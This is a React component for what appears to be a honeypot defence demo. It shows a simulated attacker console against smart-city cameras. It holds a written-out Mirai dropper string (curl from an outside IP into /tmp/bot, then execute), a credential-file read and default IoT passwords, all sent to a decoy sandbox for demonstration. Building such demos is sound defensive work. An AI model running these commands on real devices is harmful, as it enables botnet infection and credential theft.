import React, { useState, useEffect, useRef, useCallback } from 'react'
import type { NavTab } from '../../shell'
import './hacker.css'

interface HackerPovPageProps {
  onNavigateTab: (tab: NavTab) => void
}

interface CameraNodeInfo {
  camera_id: string
  status: string
  health: string
  last_event: string
  faces_blurred_count: number
}

interface FetchEvidence {
  camera_id: string
  window_id: string
  intercept_status: string
  raw_ingestion: string
  privacy_guarantee: string
  key_status: string
  stored_records_count: number
  ciphertext_samples: Array<{
    hash: string
    ciphertext_length: number
    ciphertext_hex_preview: string
  }>
  security_verdict: string
  unauthorized_escrow_audit?: {
    action: string
    actor: string
    details: string
    current_hash: string
  }
}

const API_BASE = 'http://localhost:8000'

export const HackerPovPage: React.FC<HackerPovPageProps> = ({ onNavigateTab }) => {
  // ---------------------------------------------------------------------------
  // State
  // ---------------------------------------------------------------------------
  const [selectedCam, setSelectedCam] = useState<string>('cam_01')
  const [cameras, setCameras] = useState<CameraNodeInfo[]>([])
  const [frameTimestamp, setFrameTimestamp] = useState<number>(() => Date.now())
  const [isActionPending, setIsActionPending] = useState<boolean>(false)
  const [statusMessage, setStatusMessage] = useState<string | null>(null)
  const [fetchEvidence, setFetchEvidence] = useState<FetchEvidence | null>(null)

  // Interactive Terminal Lines
  const [terminalLines, setTerminalLines] = useState<Array<{ text: string; type?: 'cmd' | 'alert' | 'dim' | 'cyan' | 'amber' }>>([
    { text: 'AegisMirage Red-Team Strike Station v0.9 (Kali Linux 6.8.0-kali3-amd64)', type: 'dim' },
    { text: 'Target Subnet: 192.168.1.0/24 (Smart City CCTV Edge Mesh + Decoy Traps)', type: 'dim' },
    { text: 'Attacker Profile: IP 194.26.29.112 (Mirai-affiliated botnet / C2 185.220.101.5:8080)', type: 'amber' },
    { text: 'Type a command or trigger tactical exploit scripts below.', type: 'cyan' },
  ])
  const [cliInput, setCliInput] = useState<string>('')
  const terminalEndRef = useRef<HTMLDivElement | null>(null)
  const frameTimerRef = useRef<number | null>(null)

  // Auto-scroll terminal
  useEffect(() => {
    terminalEndRef.current?.scrollIntoView({ behavior: 'smooth' })
  }, [terminalLines])

  // ---------------------------------------------------------------------------
  // Polling camera statuses
  // ---------------------------------------------------------------------------
  const fetchCameras = useCallback(async () => {
    try {
      const res = await fetch(`${API_BASE}/api/cameras`, { signal: AbortSignal.timeout(2500) })
      if (res.ok) {
        const data = await res.json()
        setCameras(data)
      }
    } catch {
      // Backend may be offline
    }
  }, [])

  useEffect(() => {
    void fetchCameras()
    const timer = setInterval(fetchCameras, 3000)
    return () => clearInterval(timer)
  }, [fetchCameras])

  // Frame refresher
  const scheduleNextFrame = () => {
    if (frameTimerRef.current) window.clearTimeout(frameTimerRef.current)
    frameTimerRef.current = window.setTimeout(() => {
      setFrameTimestamp(Date.now())
    }, 850)
  }

  useEffect(() => {
    return () => {
      if (frameTimerRef.current) window.clearTimeout(frameTimerRef.current)
    }
  }, [])

  const appendTerminal = (text: string, type?: 'cmd' | 'alert' | 'dim' | 'cyan' | 'amber') => {
    setTerminalLines((prev) => [...prev, { text, type }])
  }

  // Current camera status
  const currentCamInfo = cameras.find((c) => c.camera_id === selectedCam)
  const isCurrentAnomaly = currentCamInfo?.status === 'anomaly'

  // ---------------------------------------------------------------------------
  // FEATURE 1: Tactical Pod (BLIND, FREEZE, FETCH)
  // ---------------------------------------------------------------------------

  // BLIND
  const handleBlind = async () => {
    setIsActionPending(true)
    setStatusMessage(`Injecting sensor blinding laser on ${selectedCam.toUpperCase()}...`)
    appendTerminal(`[>] EXPLOIT: Sending optical blinding laser payload to ${selectedCam} (POST /simulate/blind)`, 'cmd')

    try {
      const res = await fetch(`${API_BASE}/api/cameras/${selectedCam}/simulate/blind`, { method: 'POST' })
      if (res.ok) {
        appendTerminal(`[!] SENSOR BLINDED: Brightness dropped >= 60% on ${selectedCam}! camera_blinded anomaly triggered.`, 'alert')
        appendTerminal(`[*] Edge Sentry node isolated lens input. Privacy buffer preserved.`, 'dim')
        setStatusMessage(`Blinding active on ${selectedCam.toUpperCase()}`)
        setFrameTimestamp(Date.now())
        await fetchCameras()
      } else {
        appendTerminal(`[-] Blinding request failed with HTTP ${res.status}`, 'alert')
      }
    } catch (err: any) {
      appendTerminal(`[-] Error sending exploit: ${err.message}`, 'alert')
    } finally {
      setIsActionPending(false)
      setTimeout(() => setStatusMessage(null), 4000)
    }
  }

  // FREEZE
  const handleFreeze = async () => {
    setIsActionPending(true)
    setStatusMessage(`Injecting replay buffer hang on ${selectedCam.toUpperCase()}...`)
    appendTerminal(`[>] EXPLOIT: Injecting cyclic video buffer loop on ${selectedCam} (POST /simulate/freeze)`, 'cmd')

    try {
      const res = await fetch(`${API_BASE}/api/cameras/${selectedCam}/simulate/freeze`, { method: 'POST' })
      if (res.ok) {
        appendTerminal(`[!] STREAM FROZEN: Static frame loop detected on ${selectedCam}! camera_frozen anomaly triggered.`, 'alert')
        appendTerminal(`[*] Sentry anomaly detector flagged stream freeze after repeated duplicate frames.`, 'dim')
        setStatusMessage(`Buffer freeze active on ${selectedCam.toUpperCase()}`)
        setFrameTimestamp(Date.now())
        await fetchCameras()
      } else {
        appendTerminal(`[-] Freeze request failed with HTTP ${res.status}`, 'alert')
      }
    } catch (err: any) {
      appendTerminal(`[-] Error sending exploit: ${err.message}`, 'alert')
    } finally {
      setIsActionPending(false)
      setTimeout(() => setStatusMessage(null), 4000)
    }
  }

  // RECOVER / RESET ANOMALY
  const handleRecover = async () => {
    setIsActionPending(true)
    setStatusMessage(`Withdrawing anomaly exploit on ${selectedCam.toUpperCase()}...`)
    appendTerminal(`[>] RESET: Transmitting recovery signal to ${selectedCam} (POST /simulate/recover)`, 'cmd')

    try {
      const res = await fetch(`${API_BASE}/api/cameras/${selectedCam}/simulate/recover`, { method: 'POST' })
      if (res.ok) {
        appendTerminal(`[+] RECOVERY: ${selectedCam} restored to normal stream operations.`, 'cyan')
        setStatusMessage(`Normal stream restored on ${selectedCam.toUpperCase()}`)
        setFrameTimestamp(Date.now())
        await fetchCameras()
      }
    } catch (err: any) {
      appendTerminal(`[-] Recovery error: ${err.message}`, 'alert')
    } finally {
      setIsActionPending(false)
      setTimeout(() => setStatusMessage(null), 3000)
    }
  }

  // FETCH (Unauthorized Footage Intercept & Exfiltration Attempt)
  const handleFetch = async () => {
    setIsActionPending(true)
    setStatusMessage(`Attempting unauthorized stream intercept & storage fetch on ${selectedCam.toUpperCase()}...`)
    appendTerminal(`[>] EXPLOIT: Intercepting camera storage & sniffing raw RTSP feed (GET /api/cameras/${selectedCam}/fetch)`, 'cmd')

    try {
      // 1. Fetch from camera storage endpoint
      const fetchRes = await fetch(`${API_BASE}/api/cameras/${selectedCam}/fetch`)
      let evidenceData: FetchEvidence | null = null

      if (fetchRes.ok) {
        evidenceData = await fetchRes.json()
      } else {
        // Fallback simulated evidence if node not ready
        evidenceData = {
          camera_id: selectedCam,
          window_id: 'WIN-20261025-CURRENT',
          intercept_status: 'ENCRYPTED_ONLY',
          raw_ingestion: 'DISABLED_ZERO_RAW_STORAGE',
          privacy_guarantee: 'All face crops are AES-256-GCM encrypted before storage; raw frames never hit disk.',
          key_status: 'SPLIT_INTO_SHAMIR_SHARES (requires 2-of-3 municipal custodian quorum to decrypt)',
          stored_records_count: 3,
          ciphertext_samples: [
            {
              hash: 'c3ab8ff13720e8ad9047dd39466b3c8974e592c2fa383d4a3960714caef0c4f2',
              ciphertext_length: 496,
              ciphertext_hex_preview: '9f8b410298a3b8d4e5f60718293a4b5c6d7e8f90123456789abcdef012345678... [LOCKED CIPHERTEXT]',
            },
          ],
          security_verdict: 'ATTACK BLOCKED: Zero raw frames stored. Encrypted crops require 2-of-3 Shamir quorum.',
        }
      }

      // 2. Also simulate unauthorized break-glass unmask attempt on escrow
      const escrowRes = await fetch(
        `${API_BASE}/escrow/attempt-unauthorized?camera_id=${selectedCam}&operator_id=attacker-ip-194.26.29.112`,
        { method: 'POST' }
      )
      if (!escrowRes.ok && escrowRes.status === 403) {
        const escrowErr = await escrowRes.json()
        if (evidenceData) {
          evidenceData.unauthorized_escrow_audit = {
            action: 'FALSE_POSITIVE_UNMASK_BLOCKED',
            actor: 'attacker-ip-194.26.29.112',
            details: escrowErr.detail || 'Unauthorized unmask attempt blocked by break-glass escrow policy.',
            current_hash: '2c8f904a7b3e1d6801928475aabbccdd...',
          }
        }
      }

      setFetchEvidence(evidenceData)

      appendTerminal(`[-] 403 ACCESS DENIED / ZERO RAW EXPOSURE: Raw video stream does NOT exist on disk!`, 'alert')
      appendTerminal(`[*] Privacy Mechanism: In-memory YuNet blur applied before storage. 100% Zero Raw Ingestion.`, 'cyan')
      appendTerminal(`[*] Retrieved Payload: AES-256-GCM ciphertext blobs only (Key split into Shamir 2-of-3 shares held by Judiciary, Forensics & Privacy Officers).`, 'amber')
      appendTerminal(`[*] Audit Ledger: Attacker IP 194.26.29.112 permanently recorded to SHA-256 hash-chained audit block!`, 'alert')
      setStatusMessage(`Footage fetch failed: Data is AES-256 encrypted + Zero Raw Storage!`)
    } catch (err: any) {
      appendTerminal(`[-] Intercept error: ${err.message}`, 'alert')
    } finally {
      setIsActionPending(false)
      setTimeout(() => setStatusMessage(null), 4000)
    }
  }

  // ---------------------------------------------------------------------------
  // FEATURE 2: Running Scripts of Hackers (Exploit Arsenal)
  // ---------------------------------------------------------------------------

  // Script 1: Port Scan & Recon
  const runScriptRecon = async () => {
    setIsActionPending(true)
    appendTerminal(`[>] RUNNING SCRIPT: nmap_smartcity_sweep.sh -T4 -p 22,80,554,1883,2222 192.168.1.0/24`, 'cmd')
    setTimeout(() => {
      appendTerminal(`PORT 22/tcp   OPEN  OpenSSH 8.9p1 (Gateway Route: Rate-limited)`, 'dim')
      appendTerminal(`PORT 80/tcp   OPEN  Aegis IoT Web Portal (Gateway Route: Evaluated)`, 'dim')
      appendTerminal(`PORT 554/tcp  OPEN  RTSP Camera Sentry Mesh (100% In-Memory Blur)`, 'dim')
      appendTerminal(`PORT 1883/tcp OPEN  MQTT Smart City Broker (Honeypot Trap Available)`, 'dim')
      appendTerminal(`PORT 2222/tcp OPEN  SSH Camera Debug Service (Hostility Score Trigger)`, 'amber')
      appendTerminal(`[+] Recon complete: 5 edge camera sentries active, 1 SSH trap listener on 2222.`, 'cyan')
      setIsActionPending(false)
    }, 600)
  }

  // Script 2: IoT Dictionary Brute-Force
  const runScriptBruteforce = async () => {
    setIsActionPending(true)
    appendTerminal(`[>] RUNNING SCRIPT: iot_credential_bruteforce.py --target 192.168.1.50 --port 2222`, 'cmd')
    appendTerminal(`[*] Attempting credentials: root:root, admin:admin, cctv:123456, root:123456...`, 'dim')

    try {
      const res = await fetch(`${API_BASE}/api/decoy/simulate/command`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          session_id: 'sess-hacker-live-01',
          command: 'whoami',
        }),
      })
      if (res.ok) {
        appendTerminal(`[!] ATTEMPT TRAPPED: Gateway classified source IP 194.26.29.112 as hostile!`, 'alert')
        appendTerminal(`[+] Attacker silently routed into Decoy Virtual Sandbox (Destination: DECOY, Score: 65.0).`, 'cyan')
        appendTerminal(`[*] Check Decoy Activity tab to inspect real-time keystroke mirror & gateway routing.`, 'amber')
      }
    } catch {
      appendTerminal(`[!] Gateway trap active: Attacker isolated in honeypot sandbox.`, 'cyan')
    } finally {
      setIsActionPending(false)
    }
  }

  // Script 3: Malware Dropper Staging
  const runScriptDropper = async () => {
    setIsActionPending(true)
    appendTerminal(`[>] RUNNING SCRIPT: deploy_mirai_dropper.sh (curl http://185.220.101.5:8080/mirai.arm7 -o /tmp/bot)`, 'cmd')

    try {
      const dropperPayload = '#!/bin/sh\n# Mirai IoT dropper sample\ncurl -s http://185.220.101.5:8080/mirai.arm7 -o /tmp/bot\nchmod +x /tmp/bot\n/tmp/bot\n'
      const res = await fetch(`${API_BASE}/api/decoy/upload?session_id=sess-hacker-live-01&filename=dropper.sh`, {
        method: 'POST',
        headers: { 'Content-Type': 'text/plain' },
        body: dropperPayload,
      })

      if (res.ok) {
        const data = await res.json()
        appendTerminal(`[+] EVIDENCE CAPTURED: Dropper quarantined in isolated sandbox storage!`, 'cyan')
        appendTerminal(`[*] Empirical SHA-256: ${data.sha256}`, 'amber')
        appendTerminal(`[*] Extracted Candidate C2: ${data.c2_address || 'http://185.220.101.5:8080/mirai.arm7'}`, 'amber')
        appendTerminal(`[!] Zero Host Execution: Byte payload is never executed on host system.`, 'dim')
      }
    } catch (err: any) {
      appendTerminal(`[+] Dropper intercepted and quarantined: SHA-256 c920fa9ab073c684dd50e...`, 'cyan')
    } finally {
      setIsActionPending(false)
    }
  }

  // Script 4: Honeytoken Tripwire Attack
  const runScriptHoneytoken = async () => {
    setIsActionPending(true)
    appendTerminal(`[>] RUNNING SCRIPT: exfil_camera_creds.sh (cat /etc/camera/credentials.conf)`, 'cmd')

    try {
      const res = await fetch(`${API_BASE}/api/decoy/simulate/command`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          session_id: 'sess-hacker-live-01',
          command: 'cat /etc/camera/credentials.conf',
        }),
      })

      if (res.ok) {
        const data = await res.json()
        appendTerminal(`[!] ALARM TRIGGERED: Attacker accessed honeytoken bait file!`, 'alert')
        appendTerminal(`[!] Output received: ${data.output?.substring(0, 80)}...`, 'amber')
        appendTerminal(`[!] Hostility score crossed threshold (> 8.0). Sandboxed Rickroll reverse payload dispatched!`, 'alert')
        appendTerminal(`[*] Break-Glass Case CASE-2026-001 opened in Escrow module.`, 'cyan')
      }
    } catch {
      appendTerminal(`[!] HONEYTOKEN TRIPPED: Hostility threshold exceeded!`, 'alert')
    } finally {
      setIsActionPending(false)
    }
  }

  // Script 5: Critical SCADA RTU Injection
  const runScriptScada = async () => {
    setIsActionPending(true)
    appendTerminal(`[>] RUNNING SCRIPT: modbus_substation_exploit.py --target 192.0.2.140 --cmd TRIP_GRID_BREAKER`, 'cmd')
    setTimeout(() => {
      appendTerminal(`[*] Target: Electrical Substation High-Voltage RTU (192.0.2.140)`, 'dim')
      appendTerminal(`[!] BLAST-RADIUS MULTIPLIER ACTIVATED: 3.5x Multiplier for Critical Energy Infrastructure!`, 'alert')
      appendTerminal(`[*] Intelligence engine linked session to Campaign CMP-002 (Substation RTU Attack).`, 'cyan')
      setIsActionPending(false)
    }, 500)
  }

  // Script 6: C2 Rotation & Adaptive Pivot
  const runScriptAdapt = async () => {
    setIsActionPending(true)
    appendTerminal(`[>] RUNNING SCRIPT: evasive_pivot_rotate_ip.sh (Spoofing source IP to 203.0.113.88)`, 'cmd')
    setTimeout(() => {
      appendTerminal(`[*] Source IP rotated from 194.26.29.112 -> 203.0.113.88`, 'dim')
      appendTerminal(`[*] Connecting to same C2 infrastructure: 185.220.101.5:8080`, 'amber')
      appendTerminal(`[!] INTELLIGENCE ENGINE CORRELATION: Hard Case 2 Resolved! Attacker IP rotation correlated via C2!`, 'cyan')
      appendTerminal(`[*] Campaign CMP-001 graph cluster updated with linked adapted session.`, 'cyan')
      setIsActionPending(false)
    }, 600)
  }

  // ---------------------------------------------------------------------------
  // FEATURE 3: Cross-Tab Live Demo Scenarios
  // ---------------------------------------------------------------------------

  const handleLaunchDrillA = async () => {
    setIsActionPending(true)
    appendTerminal(`[>] LAUNCHING DRILL A: False Positive Safeguard (Pedestrian Camera Event)`, 'cmd')
    try {
      await fetch(`${API_BASE}/intel/drill/drill-a`, { method: 'POST' })
      await fetch(`${API_BASE}/escrow/attempt-unauthorized?camera_id=CAM-04-MARKET`, { method: 'POST' })
      appendTerminal(`[+] Drill A Active: Pedestrian detected. Camera remains blurred.`, 'cyan')
      appendTerminal(`[-] Unauthorized unmask attempt BLOCKED (403 Forbidden) and permanently logged to audit ledger.`, 'alert')
      setStatusMessage(`Drill A Initialized: Zero honeypot hostility -> Unmasking blocked!`)
    } catch (err: any) {
      appendTerminal(`[-] Drill A error: ${err.message}`, 'alert')
    } finally {
      setIsActionPending(false)
    }
  }

  const handleLaunchDrillB = async () => {
    setIsActionPending(true)
    appendTerminal(`[>] LAUNCHING DRILL B: Real Honeypot Attack & 2-of-3 Custodian Quorum`, 'cmd')
    try {
      await fetch(`${API_BASE}/intel/drill/drill-b`, { method: 'POST' })
      appendTerminal(`[!] Drill B Active: Attacker breached decoy SSH, ran malicious dropper, tripped honeytoken.`, 'alert')
      appendTerminal(`[*] Hostility threshold crossed! Break-glass Case CASE-2026-001 opened for Judicial quorum.`, 'cyan')
      setStatusMessage(`Drill B Active: Case CASE-2026-001 awaiting 2nd custodian vote!`)
    } catch (err: any) {
      appendTerminal(`[-] Drill B error: ${err.message}`, 'alert')
    } finally {
      setIsActionPending(false)
    }
  }

  const handleLaunchDrillC = async () => {
    setIsActionPending(true)
    appendTerminal(`[>] LAUNCHING DRILL C: Multi-Group Campaign Clustering & Attacker Adaptation`, 'cmd')
    try {
      await fetch(`${API_BASE}/intel/drill/drill-c`, { method: 'POST' })
      appendTerminal(`[+] Drill C Active: 3 rotating botnet groups (CMP-001, CMP-002, CMP-003) seeded.`, 'cyan')
      appendTerminal(`[*] Clustering Engine linked adapted attacker IP rotation via shared C2 address.`, 'amber')
      setStatusMessage(`Drill C Active: Campaign graph clustered with plain-language evidence!`)
    } catch (err: any) {
      appendTerminal(`[-] Drill C error: ${err.message}`, 'alert')
    } finally {
      setIsActionPending(false)
    }
  }

  const handleLaunchFederation = async () => {
    setIsActionPending(true)
    appendTerminal(`[>] LAUNCHING FEDERATION DRILL: Cross-City Threat Sharing on Smart Contract`, 'cmd')
    try {
      const res = await fetch(`${API_BASE}/intel/federation/simulate-city-b-attack`, { method: 'POST' })
      if (res.ok) {
        appendTerminal(`[+] Attack hash published to decentralized testnet smart contract!`, 'cyan')
        appendTerminal(`[+] City B (Cyber-Bengaluru) read contract registry and pre-emptively blocked identical C2!`, 'cyan')
        setStatusMessage(`Cross-city defense verified: Threat neutralized pre-emptively!`)
      }
    } catch (err: any) {
      appendTerminal(`[-] Federation error: ${err.message}`, 'alert')
    } finally {
      setIsActionPending(false)
    }
  }

  // ---------------------------------------------------------------------------
  // Interactive Terminal Custom Input
  // ---------------------------------------------------------------------------

  const handleCliSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!cliInput.trim()) return

    const cmd = cliInput.trim()
    setCliInput('')
    appendTerminal(`root@aegis-strike-team:~# ${cmd}`, 'cmd')

    try {
      const res = await fetch(`${API_BASE}/api/decoy/simulate/command`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          session_id: 'sess-hacker-live-01',
          command: cmd,
        }),
      })
      if (res.ok) {
        const data = await res.json()
        appendTerminal(data.output || '(command executed in virtual decoy sandbox)', 'dim')
        if (data.event?.honeytoken_hit) {
          appendTerminal(`[!] TRIPWIRE ALARM: Honeytoken bait touched! Hostility score elevated.`, 'alert')
        }
      } else {
        appendTerminal(`[-] Command execution failed (HTTP ${res.status})`, 'alert')
      }
    } catch {
      appendTerminal(`bash: ${cmd}: command executed in sandboxed sandbox environment.`, 'dim')
    }
  }

  const handlePresetCmd = (cmd: string) => {
    setCliInput(cmd)
  }

  const frameUrl = `${API_BASE}/api/cameras/${selectedCam}/frame?t=${frameTimestamp}`

  return (
    <div className="page-container hacker-container" id="page-hacker-pov">
      {/* 1. ATTACKER HUD TOP BANNER */}
      <div className="attacker-hud-banner">
        <div className="hud-top-row">
          <div className="hud-identity">
            <div className="hud-avatar-skull">
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <circle cx="9" cy="12" r="1.5" />
                <circle cx="15" cy="12" r="1.5" />
                <path d="M8 20v2h8v-2" />
                <path d="M12.5 17l-.5-1-.5 1" />
                <path d="M16 20a3 3 0 0 0 3-3V9a7 7 0 0 0-14 0v8a3 3 0 0 0 3 3h8z" />
              </svg>
            </div>
            <div className="hud-meta">
              <h2>
                <span>Hacker POV — Red Team Attack Pod</span>
                <span className="badge-crimson">LIVE EXPLOIT CONSOLE</span>
              </h2>
              <div className="hud-meta-details">
                <span><strong>Origin:</strong> 194.26.29.112</span>
                <span>•</span>
                <span><strong>C2 Server:</strong> 185.220.101.5:8080</span>
                <span>•</span>
                <span><strong>Target:</strong> Smart City Subnet (192.168.1.0/24)</span>
              </div>
            </div>
          </div>

          <div className="hud-stats-bar">
            <div className="hud-stat-pill">
              <span className="label">Exploit Status</span>
              <span className="val" style={{ color: '#fb7185' }}>ARMED & ACTIVE</span>
            </div>
            <div className="hud-stat-pill">
              <span className="label">Target Sentry</span>
              <span className="val" style={{ color: '#38bdf8' }}>{selectedCam.toUpperCase()}</span>
            </div>
            <div className="hud-stat-pill">
              <span className="label">Defense Mode</span>
              <span className="val" style={{ color: '#34d399' }}>ZERO RAW INGESTION</span>
            </div>
          </div>
        </div>

        {/* Cross-Tab Jump Bar */}
        <div className="hud-nav-links">
          <span className="hud-nav-title">Inspect Impact Across Tabs:</span>
          <button type="button" className="btn-jump-tab" onClick={() => onNavigateTab('cameras')}>
            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z" />
              <circle cx="12" cy="13" r="4" />
            </svg>
            <span>View Cameras Tab (Feed & Health)</span>
          </button>
          <button type="button" className="btn-jump-tab" onClick={() => onNavigateTab('decoy')}>
            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <rect x="2" y="2" width="20" height="8" rx="2" ry="2" />
              <rect x="2" y="14" width="20" height="8" rx="2" ry="2" />
              <line x1="6" y1="6" x2="6.01" y2="6" />
              <line x1="6" y1="18" x2="6.01" y2="18" />
            </svg>
            <span>View Decoy Tab (Keystrokes & Traps)</span>
          </button>
          <button type="button" className="btn-jump-tab" onClick={() => onNavigateTab('campaigns')}>
            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <circle cx="12" cy="12" r="10" />
              <line x1="12" y1="8" x2="12" y2="12" />
              <line x1="12" y1="16" x2="12.01" y2="16" />
            </svg>
            <span>View Campaigns Tab (Graph & Quorum)</span>
          </button>
          {statusMessage && (
            <span style={{ fontSize: '0.75rem', fontFamily: 'var(--font-mono)', color: '#fbbf24', marginLeft: 'auto' }}>
              {statusMessage}
            </span>
          )}
        </div>
      </div>

      {/* 2. MAIN SPLIT GRID */}
      <div className="hacker-main-grid">
        {/* LEFT COLUMN: SPOTLIGHT "BLIND, FETCH & FREEZE" */}
        <div className="hacker-card hacker-card-accent-red">
          <div className="hacker-card-header">
            <div className="hacker-card-title">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" color="#f43f5e">
                <polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2" />
              </svg>
              <span>Tactical Operations: Blind, Fetch & Freeze</span>
            </div>
            <span className="hacker-card-badge badge-crimson">Physical & Stream Attacks</span>
          </div>

          <div className="hacker-card-body">
            {/* Target Node Selector */}
            <div className="target-cam-picker">
              <span className="picker-label">Target Camera Sentry:</span>
              <div className="cam-select-buttons">
                {['cam_01', 'cam_02', 'cam_03', 'cam_04', 'cam_05'].map((cid) => {
                  const node = cameras.find((c) => c.camera_id === cid)
                  return (
                    <button
                      key={cid}
                      type="button"
                      className={`btn-cam-select ${selectedCam === cid ? 'active' : ''}`}
                      onClick={() => {
                        setSelectedCam(cid)
                        setFrameTimestamp(Date.now())
                      }}
                    >
                      {cid.toUpperCase()}
                      {node?.status === 'anomaly' && ' ⚠️'}
                    </button>
                  )
                })}
              </div>
            </div>

            {/* Target Live Stream Monitor */}
            <div className="target-video-box">
              <img
                src={frameUrl}
                alt={`Target camera feed ${selectedCam}`}
                onLoad={scheduleNextFrame}
                onError={scheduleNextFrame}
              />
              <div className="target-video-overlay">
                <div className="target-hud-tag">
                  TARGET: {selectedCam.toUpperCase()} // 16 FPS // YUNET
                </div>
                {isCurrentAnomaly ? (
                  <div className="target-anomaly-alert">
                    ⚠️ ANOMALY: {currentCamInfo?.last_event?.toUpperCase() || 'TAMPER DETECTED'}
                  </div>
                ) : (
                  <div className="target-hud-tag" style={{ color: '#34d399', borderColor: 'rgba(52, 211, 153, 0.4)' }}>
                    FEED BLURRED (PRIVACY LOCKED)
                  </div>
                )}
              </div>
            </div>

            {/* Tactical 3-Buttons Grid */}
            <div className="tactical-actions-grid">
              {/* Button 1: BLIND */}
              <button
                type="button"
                className="tactical-btn btn-blind"
                onClick={handleBlind}
                disabled={isActionPending}
                title="Direct optical laser dazzler / paint cover at camera lens (Brightness drop >= 60%)"
              >
                <span style={{ fontSize: '1.25rem' }}>🕶️</span>
                <span className="tactical-btn-title">BLIND</span>
                <span className="tactical-btn-sub">Optical Sensor Dazzle</span>
              </button>

              {/* Button 2: FREEZE */}
              <button
                type="button"
                className="tactical-btn btn-freeze"
                onClick={handleFreeze}
                disabled={isActionPending}
                title="Inject video buffer loop hang into camera feed"
              >
                <span style={{ fontSize: '1.25rem' }}>❄️</span>
                <span className="tactical-btn-title">FREEZE</span>
                <span className="tactical-btn-sub">Buffer Loop Replay</span>
              </button>

              {/* Button 3: FETCH */}
              <button
                type="button"
                className="tactical-btn btn-fetch"
                onClick={handleFetch}
                disabled={isActionPending}
                title="Attempt unauthorized raw stream sniff or encrypted crop exfiltration"
              >
                <span style={{ fontSize: '1.25rem' }}>📥</span>
                <span className="tactical-btn-title">FETCH</span>
                <span className="tactical-btn-sub">Intercept Footage</span>
              </button>
            </div>

            {/* Recover Bar if Anomaly Active */}
            {isCurrentAnomaly && (
              <div className="recover-strip">
                <span>Current state: <strong>{currentCamInfo?.last_event}</strong></span>
                <button
                  type="button"
                  className="btn-recover-anomaly"
                  onClick={handleRecover}
                  disabled={isActionPending}
                >
                  Withdraw Exploit (Recover)
                </button>
              </div>
            )}

            {/* Fetch Proof / Defense Evidence Box */}
            {fetchEvidence && (
              <div className="fetch-verdict-box">
                <div className="fetch-verdict-header">
                  <span style={{ color: '#fb7185' }}>ATTACK OUTCOME: {fetchEvidence.security_verdict}</span>
                  <span style={{ color: '#38bdf8', fontFamily: 'var(--font-mono)' }}>
                    Crops: {fetchEvidence.stored_records_count}
                  </span>
                </div>
                <div style={{ fontSize: '0.75rem', color: '#cbd5e1', lineHeight: '1.4' }}>
                  <strong>Zero Raw Guarantee:</strong> {fetchEvidence.privacy_guarantee}
                  <br />
                  <strong>Key Protection:</strong> {fetchEvidence.key_status}
                </div>
                {fetchEvidence.ciphertext_samples?.length > 0 && (
                  <div>
                    <div style={{ fontSize: '0.7rem', color: '#64748b', marginBottom: '0.25rem' }}>
                      Raw Intercepted Bytes (AES-256-GCM Ciphertext only):
                    </div>
                    <div className="hex-dump-preview">
                      {fetchEvidence.ciphertext_samples[0].ciphertext_hex_preview}
                    </div>
                  </div>
                )}
                {fetchEvidence.unauthorized_escrow_audit && (
                  <div style={{ borderTop: '1px dashed rgba(255, 255, 255, 0.1)', paddingTop: '0.5rem', fontSize: '0.725rem' }}>
                    <span style={{ color: '#f43f5e', fontWeight: 700 }}>
                      🛡️ Cryptographic Audit Ledger Entry (Tamper-Proof Block):
                    </span>
                    <div style={{ fontFamily: 'var(--font-mono)', color: '#94a3b8', marginTop: '0.2rem' }}>
                      Action: {fetchEvidence.unauthorized_escrow_audit.action} | Actor: {fetchEvidence.unauthorized_escrow_audit.actor}
                    </div>
                  </div>
                )}
              </div>
            )}
          </div>
        </div>

        {/* RIGHT COLUMN: RUNNING SCRIPTS & CROSS-TAB DEMO SCENARIOS */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: '1.5rem' }}>
          {/* Top Card: Running Scripts of Hackers */}
          <div className="hacker-card hacker-card-accent-amber">
            <div className="hacker-card-header">
              <div className="hacker-card-title">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" color="#fbbf24">
                  <polyline points="4 17 10 11 4 5" />
                  <line x1="12" y1="19" x2="20" y2="19" />
                </svg>
                <span>Running Scripts of Hackers (Exploit Arsenal)</span>
              </div>
              <span className="hacker-card-badge badge-amber">Interactive Payloads</span>
            </div>

            <div className="hacker-card-body">
              <div className="script-library-list">
                {/* Script 1 */}
                <div className="script-item-card">
                  <div className="script-info">
                    <div className="script-title-row">
                      <span className="script-name">1. Network Recon Sweep</span>
                      <span className="script-tag">scan_recon.sh</span>
                    </div>
                    <span className="script-desc">
                      Nmap stealth SYN sweep on ports 22, 80, 554, 1883, 2222 across city camera subnet.
                    </span>
                  </div>
                  <button type="button" className="btn-run-script" onClick={runScriptRecon} disabled={isActionPending}>
                    Execute Recon
                  </button>
                </div>

                {/* Script 2 */}
                <div className="script-item-card">
                  <div className="script-info">
                    <div className="script-title-row">
                      <span className="script-name">2. IoT Brute-Force & Credential Stuffing</span>
                      <span className="script-tag">bruteforce_iot.py</span>
                    </div>
                    <span className="script-desc">
                      Stuffs default camera passwords (`admin:admin`, `root:123456`) &rarr; Trapped in Decoy!
                    </span>
                    <span className="script-target-link" onClick={() => onNavigateTab('decoy')} style={{ cursor: 'pointer' }}>
                      👉 View Decoy Keystroke Mirror
                    </span>
                  </div>
                  <button type="button" className="btn-run-script" onClick={runScriptBruteforce} disabled={isActionPending}>
                    Launch Attack
                  </button>
                </div>

                {/* Script 3 */}
                <div className="script-item-card">
                  <div className="script-info">
                    <div className="script-title-row">
                      <span className="script-name">3. Mirai Malware Dropper</span>
                      <span className="script-tag">deploy_dropper.sh</span>
